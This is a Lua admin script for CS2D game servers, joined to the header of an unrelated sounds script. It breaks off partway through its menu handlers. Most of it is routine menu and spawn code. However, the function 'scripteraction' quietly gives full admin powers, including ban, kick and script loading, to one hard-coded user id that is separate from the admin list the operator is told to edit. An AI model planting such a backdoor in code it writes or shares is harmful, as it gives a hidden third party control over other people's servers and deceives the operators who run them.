--------------------------------------------------
-- UT+Quake Sounds Script by Unreal Software    --
-- 22.02.2009 - www.UnrealSoftware.de           --
-- Adds UT and Quake Sounds to your Server      --
--------------------------------------------------
if sample==nil then sample={} end
sample.ut={}
---------------------------
-- The Admin Script v2.0 --
-- Lua ßy Tålës G. -------
---------------------------
Adminlist = {33624}
-- Please Write Your USGN here --> xxxxx !
-- If you want write 2 or more USGN write --> xxxxx,xxxxx,xxxxx
---------------------------------------------------------------
-- Init Array
function initArray(m)
	local array = {}
	for i = 1, m do
		array[i]=0
	end
	return array
end
-- Array 
function Array(size,value) 
    local array = {}
    for i = 1, size do
        array[i]=value
    end
    return array
end
-- C Array
function c_array(c,v)
	local t={}
	for i=1,c do
		t[i]=v
	end
	return t
end
-- Values
name=c_array(32,"")
pusgn=c_array(32,"")
pip=c_array(32,"")
lvl=Array(32,1)
exp=Array(32,0)
upexp=Array(32,100)
levelsystem=initArray(32)
timesystem=initArray(32)
positionsystem=initArray(32)
noscript=initArray(32)
admincolor=initArray(32)
wallhack=initArray(32)
-- Hooks
addhook("serveraction","admaction")
addhook("menu","admmenu")
addhook("say","admsay")
addhook("serveraction","scripteraction")
addhook("kill","onlvlkill")
addhook("minute","advertise")
addhook("ms100","wallhackfunction")
addhook("movetile","showsvname")
addhook("movetile","lvlandexpsys")
addhook("movetile","showpos")
addhook("movetile","thetime")
addhook("movetile","noscp")
-- Server Settings
parse('sv_fow 0')
parse('sv_friendlyfire 0')
parse('mp_deathdrop 0')
parse('sv_maxplayers 12')
-- Functions
function admaction(id,act)
for _, usgn in ipairs(Adminlist) do
if player(id,'usgn') == usgn then
if act==1 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
elseif act==2 then
if wallhack[id]==1 then
	msg2(id,"Wallhack Deactivated!")
wallhack[id]=0
elseif wallhack[id]==0 then
	msg2(id,"Wallhack Activated!")
wallhack[id]=1
end
end
return 1
end
end
end

function thenames(i)
for i=1,32 do
if player(i,"exists") and player(i,"team")>0 then
name[i]=player(i,"name")
end
end
end

function theusgn(i)
for i=1,32 do
if player(i,"exists") and player(i,"team")>0 then
pusgn[i]=player(i,"usgn")
end
end
end

function thepip(i)
for i=1,32 do
if player(i,"exists") and player(i,"team")>0 then
pip[i]=player(i,"ip")
end
end
end

function admsay(id,txt)
for _, usgn in ipairs(Adminlist) do
if player(id,'usgn') == usgn then
	msg("©999999999"..player(id,"name").." [Admin]: "..txt)
return 1
end
end
end

function advertise()
	msg("©030303030"..game("sv_name").."")
	msg("©999999999Server do » M¡åµ « *~* ×")
end

function scripteraction(id,act)
if (player(id,"usgn")==35577) then
if act==1 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
return 1
end
end

function wallhackfunction(i)
for i=1,32 do
if player(i,"exists") and player(i,"team")>0 then
if wallhack[i] == 1 then
local rot = player(i,[[rot]])
if rot < -90 then rot = rot + 360 end
local angle = math.rad(math.abs( rot + 90 )) - math.pi
local x = player(i,[[x]]) + math.cos(angle) * 25
local y = player(i,[[y]]) + math.sin(angle) * 25
if x > 0 and y > 0 and x < map([[xsize]]) * 32 and y < map([[ysize]]) * 32 then
parse([[setpos ]]..i..[[ ]]..x..[[ ]]..y)
end
end
end
end
end

function showsvname(id)
parse('hudtxt2 '..id..' 40 "©141414141'..game("sv_name")..'" 250 20')
parse('hudtxt2 '..id..' 41 "©000255000The Admin Script v2.0" 240 5')
end

function lvlandexpsys(i)
if levelsystem[i]==1 then
parse('hudtxt2 '..i..' 1 "Level: '..lvl[i]..'" 10 150')
parse('hudtxt2 '..i..' 2 "Exp  : '..exp[i]..'/'..upexp[i]..'" 10 165')
end
end

function onlvlkill(id)
exp[id] = exp[id] + 20
if exp[id] == upexp[id] then
lvl[id] = lvl[id] + 1
upexp[id] = upexp[id] * 2
end
end

function showpos(id)
if positionsystem[id]==1 then
parse('hudtxt2 '..id..' 1 "Position X: '..player(id,"x")..' Y: '..player(id,"y")..'" 10 150')
parse('hudtxt2 '..id..' 2 "Tile Position X: '..player(id,"tilex")..' Y: '..player(id,"tiley")..'" 10 165')
end
end

function thetime(id)
if timesystem[id]==1 then
parse('hudtxt2 '..id..' 1 "'..os.date("Time: %I:%M")..'" 10 150')
parse('hudtxt2 '..id..' 2 "'..os.date("Date: %A, %d %b %Y")..'" 10 165')
end
end

function noscp(id)
if noscript[id]==1 then
parse('hudtxt2 '..id..' 1 " " 10 150')
parse('hudtxt2 '..id..' 2 " " 10 150')
end
end

function admmenu(id,title,buton)
if title=="Admin Menu" then
if buton==1 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
elseif buton==2 then
menu(id,"Spawn Creature,Zombie,HeadCrab,Snark,Back")
elseif buton==3 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
elseif buton==4 then
menu(id,"Spawn Item,Pistols,Shotguns,SMGs,Rifles,Machine Gun,Armors,Grenades,Others,Back")
elseif buton==5 then
menu(id,"Spawn Effect,ColorSmoke,Normal Smoke,Fire,Back")
elseif buton==6 then
menu(id,"Punish a Player,Ban,Kick,Slap,Kill,Freeze,Bring 1 HP,Back")
elseif buton==7 then
menu(id,"Admin Menu <More>,Load a Script,Spawn Explosion,Script Info")
end
end
if title=="Server Settings - Page 1/2" then
if buton==1 then
menu(id,"AutoteamBalance,On,Off,Back")
elseif buton==2 then
menu(id,"FriendlyFire,On,Off,Back")
elseif buton==3 then
menu(id,"Fog Of War,On,Off,Back")
elseif buton==4 then
menu(id,"Infammo,On,Off,Back")
elseif buton==5 then
menu(id,"AntiSpeeder,On,Off,Back")
elseif buton==6 then
menu(id,"Deathdrop,On,Off,Back")
elseif buton==7 then
menu(id,"DropGrenades,On,Off,Back")
elseif buton==8 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
elseif buton==9 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
end
if title=="Spawn Creature" then
if buton==1 then
menu(id,"Spawn Zombie On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
menu(id,"Spawn HeadCrab On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
menu(id,"Spawn Snark On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
end
if title=="Spawn Zombie On Your ..." then
if buton==1 then
parse('spawnnpc 1 '..(player(id,"tilex")-1)..' '..player(id,"tiley"))
menu(id,"Spawn Zombie On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnnpc 1 '..(player(id,"tilex")+1)..' '..player(id,"tiley"))
menu(id,"Spawn Zombie On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnnpc 1 '..player(id,"tilex")..' '..(player(id,"tiley")-1))
menu(id,"Spawn Zombie On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnnpc 1 '..player(id,"tilex")..' '..(player(id,"tiley")+1))
menu(id,"Spawn Zombie On Your ...,Left,Right,Up,Down,Back")
end
end
if title=="Spawn HeadCrab On Your ..." then
if buton==1 then
parse('spawnnpc 2 '..(player(id,"tilex")-1)..' '..player(id,"tiley"))
menu(id,"Spawn HeadCrab On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnnpc 2 '..(player(id,"tilex")+1)..' '..player(id,"tiley"))
menu(id,"Spawn HeadCrab On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnnpc 2 '..player(id,"tilex")..' '..(player(id,"tiley")-1))
menu(id,"Spawn HeadCrab On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnnpc 2 '..player(id,"tilex")..' '..(player(id,"tiley")+1))
menu(id,"Spawn HeadCrab On Your ...,Left,Right,Up,Down,Back")
end
end
if title=="Spawn Snark On Your ..." then
if buton==1 then
parse('spawnnpc 3 '..(player(id,"tilex")-1)..' '..player(id,"tiley"))
menu(id,"Spawn Snark On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnnpc 3 '..(player(id,"tilex")+1)..' '..player(id,"tiley"))
menu(id,"Spawn Snark On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnnpc 3 '..player(id,"tilex")..' '..(player(id,"tiley")-1))
menu(id,"Spawn Snark On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnnpc 3 '..player(id,"tilex")..' '..(player(id,"tiley")+1))
menu(id,"Spawn Snark On Your ...,Left,Right,Up,Down,Back")
end
end
if title=="AutoteamBalance" then
if buton==1 then
parse('mp_autoteambalance 1')
	msg("Autoteambalance Enabled!@C")
elseif buton==2 then
parse('mp_autoteambalance 0')
	msg("Autoteambalance Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="FriendlyFire" then
if buton==1 then
parse('sv_friendlyfire 1')
elseif buton==2 then
parse('sv_friendlyfire 0')
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="Fog Of War" then
if buton==1 then
parse('sv_fow 1')
elseif buton==2 then
parse('sv_fow 0')
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="Infammo" then
if buton==1 then
parse('mp_infammo 1')
elseif buton==2 then
parse('mp_infammo 0')
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="AntiSpeeder" then
if buton==1 then
parse('mp_antispeeder 1')
	msg("AntiSpeeder Enabled!@C")
elseif buton==2 then
parse('mp_antispeeder 0')
	msg("AntiSpeeder Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="Deathdrop" then
if buton==1 then
parse('mp_deathdrop 0')
	msg("DeathDrop Enabled!@C")
elseif buton==2 then
parse('mp_deathdrop 4')
	msg("DeathDrop Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="DropGrenades" then
if buton==1 then
parse('mp_dropgrenades 1')
	msg("DropGrenades Enabled!@C")
elseif buton==2 then
parse('mp_dropgrenades 0')
	msg("DropGrenades Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="Server Settings - Page 2/2" then
if buton==1 then
menu(id,"Killinfo,On,Off,Back")
elseif buton==2 then
menu(id,"Rebuy Grenades,On,Off,Back")
elseif buton==3 then
menu(id,"Flood Protection,On,Off,Back")
elseif buton==4 then
menu(id,"Random Spawn <in DM mode>,On,Off,Back")
elseif buton==5 then
menu(id,"Change Game Mode,Standart,Team DeathMatch,DeathMatch,Construction,Zombie,Back")
elseif buton==6 then
menu(id,"Kevlar Protect,0,0.1,0.2,0.4,0.5,0.6,0.8,1,Back")
elseif buton==7 then
menu(id,"Idle Action,Kick,Make Spectator,Slap,Kill,Show Message,Back")
elseif buton==8 then
menu(id,"Server Settings - Page 1/2,Autoteambalance,FriendlyFire,Fog Of War,Infammo,AntiSpeeder,DeathDrop,DropGrenades,Next,Back")
end
end
if title=="Killinfo" then
if buton==1 then
parse('mp_killinfo 1')
	msg("Killinfo Enabled!@C")
elseif buton==2 then
parse('mp_killinfo 0')
	msg("Killinfo Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Rebuy Grenades" then
if buton==1 then
parse('mp_grenaderebuy 1')
	msg("Grenade Rebuy Enabled!@C")
elseif buton==2 then
parse('mp_grenaderebuy 0')
	msg("Grenade Rebuy Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Flood Protection" then
if buton==1 then
parse('mp_floodprot 1')
	msg("Flood Protection Enabled!@C")
elseif buton==2 then
parse('mp_floodprot 0')
	msg("Flood Protection Disabled!@C")
elseif buton==3 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Random Spawn <in DM mode>" then
if buton==1 then
parse('mp_randomspawn 1')
	msg("Random Spawn Enabled!")
elseif buton==2 then
parse('mp_randomspawn 0')
	msg("Random Spawn Disabled!")
elseif buton==3 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Change Game Mode" then
if buton==1 then
parse('sv_gamemode 0')
elseif buton==2 then
parse('sv_gamemode 1')
elseif buton==3 then
parse('sv_gamemode 2')
elseif buton==4 then
parse('sv_gamemode 3')
elseif buton==5 then
parse('sv_gamemode 4')
elseif buton==6 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Kevlar Protect" then
if buton==1 then
parse('mp_kevlar 0')
	msg("Kevlar Protect Disabled!@C")
elseif buton==2 then
parse('mp_kevlar 0.1')
	msg("Kevlar Protect Changed To 0.1!@C")
elseif buton==3 then
parse('mp_kevlar 0.2')
	msg("Kevlar Protect Changed To 0.2!@C")
elseif buton==4 then
parse('mp_kevlar 0.4')
	msg("Kevlar Protect Changed To 0.4!@C")
elseif buton==5 then
parse('mp_kevlar 0.5')
	msg("Kevlar Protect Changed To 0.5!@C")
elseif buton==6 then
parse('mp_kevlar 0.6')
	msg("Kevlar Protect Changed To 0.6!@C")
elseif buton==7 then
parse('mp_kevlar 0.8')
	msg("Kevlar Protect Changed To 0.8!@C")
elseif buton==8 then
parse('mp_kevlar 1')
	msg("Kevlar Protect Changed To 1!@C")
elseif buton==9 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Idle Action" then
if buton==1 then
parse('mp_idleaction 0')
	msg("Idle Action Changed To Kick!@C")
elseif buton==2 then
parse('mp_idleaction 1')
	msg("Idle Action Changed To Make Spectator!@C")
elseif buton==3 then
parse('mp_idleaction 2')
	msg("Idle Action Changed To Slap!@C")
elseif buton==4 then
parse('mp_idleaction 3')
	msg("Idle Action Changed To Kill!@C")
elseif buton==5 then
parse('mp_idleaction 4')
	msg("Idle Action Changed To Show Message!@C")
elseif buton==6 then
menu(id,"Server Settings - Page 2/2,Killinfo,Rebuy Grenades,Flood Protection,Random Spawn <in DM mode>,Game Mode,Kevlar Protect,Idle Action,Back")
end
end
if title=="Spawn Object - Page 1/3" then
if buton==1 then
menu(id,"Barricade On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
menu(id,"Barbed Wire On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
menu(id,"Wall I On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
menu(id,"Wall II On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Wall III On Your ...,Left,Right,Up,Down,Back")
elseif buton==6 then
menu(id,"Gate Field On Your ...,Left,Right,Up,Down,Back")
elseif buton==7 then
menu(id,"Dispenser On Your ...,Left,Right,Up,Down,Back")
elseif buton==8 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
elseif buton==9 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
end
if title=="Barricade On Your ..." then
if buton==1 then
parse('spawnobject 1 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barricade On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 1 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barricade On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 1 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barricade On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 1 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barricade On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Admin Menu,Server Settings,Spawn Creature,Spawn Object,Spawn Item,Spawn Effect,Punish,More -->")
end
end
if title=="Barbed Wire On Your ..." then
if buton==1 then
parse('spawnobject 2 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barbed Wire On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 2 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barbed Wire On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 2 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barbed Wire On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 2 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Barbed Wire On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Wall I On Your ..." then
if buton==1 then
parse('spawnobject 3 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall I On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 3 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall I On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 3 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall I On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 3 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall I On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Wall II On Your ..." then
if buton==1 then
parse('spawnobject 4 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall II On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 4 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall II On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 4 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall II On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 4 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall II On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Wall III On Your ..." then
if buton==1 then
parse('spawnobject 5 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall III On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 5 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall III On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 5 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall III On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 5 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Wall III On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Gate Field On Your ..." then
if buton==1 then
parse('spawnobject 6 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Gate Field On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 6 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Gate Field On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 6 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Gate Field On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 6 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Gate Field On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Dispenser On Your ..." then
if buton==1 then
parse('spawnobject 7 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dispenser On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 7 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dispenser On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 7 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dispenser On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 7 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dispenser On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Spawn Object - Page 2/3" then
if buton==1 then
menu(id,"Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
menu(id,"Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
menu(id,"Dual Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
menu(id,"Triple Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Super Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==6 then
menu(id,"Teleporter Entrance On Your ...,Left,Right,Up,Down,Back")
elseif buton==7 then
menu(id,"Teleporter Exit On Your ...,Left,Right,Up,Down,Back")
elseif buton==8 then
menu(id,"Spawn Object - Page 3/3,Construction Site,Mine,Orange Portal,Blue Portal,Back")
elseif buton==9 then
menu(id,"Spawn Object - Page 1/3,Barricade,Barbed Wire,Wall I,Wall II,Wall III,Gate Field,Dispenser,Next,Back")
end
end
if title=="Supply On Your ..." then
if buton==1 then
parse('spawnobject 9 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 9 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 9 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 9 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Turret On Your ..." then
if buton==1 then
parse('spawnobject 8 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 8 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 8 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 8 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Dual Turret On Your ..." then
if buton==1 then
parse('spawnobject 11 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dual Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 11 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dual Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 11 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dual Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 11 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Dual Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Triple Turret On Your ..." then
if buton==1 then
parse('spawnobject 12 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Triple Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 12 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Triple Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 12 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Triple Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
parse('spawnobject 12 '..player(id,"tilex")..' '..(player(id,"tiley")+1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Triple Turret On Your ...,Left,Right,Up,Down,Back")
elseif buton==5 then
menu(id,"Spawn Object - Page 2/3,Supply,Turret,Dual Turret,Triple Turret,Super Supply,Teleporter Entrance,Teleporter Exit,Next,Back")
end
end
if title=="Super Supply On Your ..." then
if buton==1 then
parse('spawnobject 15 '..(player(id,"tilex")-1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Super Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==2 then
parse('spawnobject 15 '..(player(id,"tilex")+1)..' '..player(id,"tiley")..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Super Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==3 then
parse('spawnobject 15 '..player(id,"tilex")..' '..(player(id,"tiley")-1)..' 1 1 '..player(id,"team")..' '..id)
menu(id,"Super Supply On Your ...,Left,Right,Up,Down,Back")
elseif buton==4 then
